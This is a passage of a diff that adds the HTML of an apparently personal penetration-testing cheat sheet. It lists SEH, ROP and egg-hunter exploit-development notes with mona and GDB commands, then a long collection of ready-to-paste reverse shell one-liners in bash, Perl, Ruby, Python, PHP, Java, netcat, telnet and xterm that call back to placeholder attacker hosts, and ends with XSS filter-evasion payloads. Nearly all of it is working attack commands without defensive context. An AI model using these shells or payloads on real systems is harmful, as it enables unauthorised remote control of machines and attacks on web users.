+&lt;span class=&quot;nv&quot;&gt;nseh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;\xeb\x06\x90\x90&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;next seh chain&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;iseh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; !pvefindaddr p1 -n -o -i &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;POP POP RETRUN or POPr32,POPr32,RETN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;rop-dep&quot;&gt;ROP (DEP)&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Return-oriented_programming
+https://en.wikipedia.org/wiki/Data_Execution_Prevention
+!mona modules
+!mona ropfunc -m *.dll -cpb &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x09\x0a&amp;quot;&lt;/span&gt;
+!mona rop -m *.dll -cpb &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x09\x0a&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auto suggest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;aslr---address-space-layout-randomization&quot;&gt;ASLR - Address space layout randomization&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Address_space_layout_randomization
+!mona noaslr&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;egg-hunter-techniques&quot;&gt;EGG Hunter techniques&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
+http://www.fuzzysecurity.com/tutorials/expDev/4.html
+!mona jmp -r esp
+!mona egg -t lxxl
+&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;eb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jump backward -60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lxxllxxl+shell
+!mona egg -t &lt;span class=&quot;s1&quot;&gt;&amp;#39;w00t&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;gdb-debugger-commands&quot;&gt;GDB Debugger Commands&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Setting Breakpoint&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; *_start
+ 
+&lt;span class=&quot;c&quot;&gt;# Execute Next Instruction&lt;/span&gt;
+next
+step
+n
+s
+ 
+&lt;span class=&quot;c&quot;&gt;# Continue Execution&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+c
+ 
+&lt;span class=&quot;c&quot;&gt;# Data&lt;/span&gt;
+checking &lt;span class=&quot;s1&quot;&gt;&amp;#39;REGISTERS&amp;#39;&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;&amp;#39;MEMORY&amp;#39;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Display Register Values: (Decimal,Binary,Hex)&lt;/span&gt;
+print /d –&amp;gt; Decimal
+print /t –&amp;gt; Binary
+print /x –&amp;gt; Hex
+O/P :
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; print /d &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 13
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; print /t &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1101
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; print /x &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xd
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Display values of specific memory locations&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; : x/nyz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Examine&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+n –&amp;gt; Number of fields to &lt;span class=&quot;nv&quot;&gt;display&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&amp;gt;
+y –&amp;gt; Format &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&amp;gt; c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;character&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;decimal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , x &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Hexadecimal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+z –&amp;gt; Size of field to be &lt;span class=&quot;nv&quot;&gt;displayed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&amp;gt; b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;byte&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , h &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;halfword&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, w &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;word &lt;span class=&quot;m&quot;&gt;32&lt;/span&gt; Bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;bash-reverse-shell&quot;&gt;BASH Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash -i &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/X.X.X.X/443 0&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1
+ 
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash 0&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;0
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash 0&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;0
+ 
+0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196
+ 
+0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196
+ 
+&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444 cat &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# or: while read line 0&amp;lt;&amp;amp;5; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444
+ 
+cat &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# or:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+ 
+/bin/bash -i &amp;gt; /dev/tcp/attackerip/8080 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1
+/bin/bash -i &amp;gt; /dev/tcp/X.X.X.X/443 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;perl-reverse-shell&quot;&gt;PERL Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;perl -MIO -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&amp;quot;attackerip:443&amp;quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&amp;#39;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# for win platform&lt;/span&gt;
+perl -MIO -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;$c=new IO::Socket::INET(PeerAddr,&amp;quot;attackerip:4444&amp;quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&amp;#39;&lt;/span&gt;
+perl -e &lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;use Socket&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;10.0.0.1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;socket&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S,PF_INET,SOCK_STREAM,getprotobyname&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;connect&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S,sockaddr_in&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;,inet_aton&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))){&lt;/span&gt;open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;STDIN,&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;amp;S&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;STDOUT,&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;amp;S&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;STDERR,&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;amp;S&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/sh -i&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;’&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ruby-reverse-shell&quot;&gt;RUBY Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;exit if fork;c=TCPSocket.new(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;){|io|c.print io.read}end&amp;#39;&lt;/span&gt;
+ 
+&lt;span class=&quot;c&quot;&gt;# for win platform&lt;/span&gt;
+ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;c=TCPSocket.new(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;){|io|c.print io.read}end&amp;#39;&lt;/span&gt;
+ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;f=TCPSocket.open(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;python-reverse-shell&quot;&gt;PYTHON Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;attackerip&amp;quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;php -r &lt;span class=&quot;s1&quot;&gt;&amp;#39;$sock=fsockopen(&amp;quot;attackerip&amp;quot;,443);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;java-reverse-shell&quot;&gt;JAVA Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Runtime.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; r.exec&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/443;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; as String&lt;span class=&quot;o&quot;&gt;[])&lt;/span&gt;
+p.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;netcat-reverse-shell&quot;&gt;NETCAT Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -e /bin/sh attackerip 4444
+nc -e /bin/sh 192.168.37.10 443
+ 
+&lt;span class=&quot;c&quot;&gt;# If the -e option is disabled, try this &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# mknod backpipe p &amp;amp;&amp;amp; nc attackerip 443 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe&lt;/span&gt;
+/bin/sh &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc attackerip 443
+rm -f /tmp/p&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mknod /tmp/p p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nc attackerip &lt;span class=&quot;m&quot;&gt;4443&lt;/span&gt; 0/tmp/
+ 
+&lt;span class=&quot;c&quot;&gt;# If you have the wrong version of netcat installed, try &lt;/span&gt;
+rm /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc attackerip &amp;gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;telnet-reverse-shell&quot;&gt;TELNET Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# If netcat is not available or /dev/tcp&lt;/span&gt;
+mknod backpipe p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; telnet attackerip &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; 0&amp;lt;backpipe &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; /bin/bash 1&amp;gt;backpipe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;xterm-reverse-shell&quot;&gt;XTERM Reverse Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Start an open X Server on your system (:1 – which listens on TCP port 6001)&lt;/span&gt;
+apt-get install xnest
+Xnest :1
+ 
+&lt;span class=&quot;c&quot;&gt;# Then remember to authorise on your system the target IP to connect to you&lt;/span&gt;
+xterm -display 127.0.0.1:1
+
+&lt;span class=&quot;c&quot;&gt;# Run this INSIDE the spawned xterm on the open X Server&lt;/span&gt;
+xhost +targetip 
+ 
+&lt;span class=&quot;c&quot;&gt;# Then on the target connect back to the your X Server&lt;/span&gt;
+xterm -display attackerip:1
+/usr/openwin/bin/xterm -display attackerip:1
+or
+&lt;span class=&quot;nv&quot;&gt;$ DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;attackerip:0 xterm&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;xss-cheat-codes&quot;&gt;XSS Cheat Codes&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt; iframes &amp;gt; src=http://IP:PORT &amp;lt;/ iframes &amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 
+&amp;lt;script&amp;gt;document.location&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://IP:PORT&amp;lt;/script&amp;gt;
+ 
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;;alert(String.fromCharCode(88,83,83))//\&amp;#39;;alert(String.fromCharCode(88,83,83))//&amp;quot;;alert(String.fromCharCode(88,83,83))//\&amp;quot;;alert(String.fromCharCode(88,83,83))//–&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;String.fromCharCode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;88,83,83&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&amp;lt;/SCRIPT&amp;gt;
+ 
+&lt;span class=&quot;s2&quot;&gt;&amp;quot;;!–&amp;quot;&lt;/span&gt;&amp;lt;XSS&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;amp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;amp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{()}&lt;/span&gt;
+ 
+&amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;);&amp;quot;&lt;/span&gt;&amp;gt;
+&amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;gt;
+&amp;lt;IMG &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;s2&quot;&gt;&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;amp;amp;amp;#106;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#118;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#115;&amp;amp;amp;amp;#99;&amp;amp;amp;amp;#114;&amp;amp;amp;amp;#105;&amp;amp;amp;amp;#112;&amp;amp;amp;amp;#116;&amp;amp;amp;amp;#58;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#108;&amp;amp;amp;amp;#101;&amp;amp;amp;amp;#114;&amp;amp;amp;amp;#116;&amp;amp;amp;amp;#40;&amp;amp;amp;amp;#39;&amp;amp;amp;amp;#88;&amp;amp;amp;amp;#83;&amp;amp;amp;amp;#83;&amp;amp;amp;amp;#39;&amp;amp;amp;amp;#41;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
